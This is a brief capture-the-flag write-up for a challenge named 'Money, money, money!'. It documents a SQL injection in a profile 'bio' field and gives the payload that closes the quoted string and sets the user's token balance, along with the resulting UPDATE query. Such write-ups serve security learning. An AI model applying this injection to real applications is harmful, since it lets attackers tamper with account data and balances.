# Challenge `Money, money, money!` writeup

- Vulnerability: SQL injection

- Where: update profile 'bio' field [SQL: UPDATE user SET bio = ''' WHERE username = 'paulobolinhas']

- Impact: attacker is able to inject a sql query and manipulate jackpot

---

## Steps to reproduce

1. Insert "', tokens= '{your_jackpot_number}" on update profile 'bio' field.

"
UPDATE user SET bio = '
', tokens= '49612
' WHERE username = 'paulobolinhas1'
"

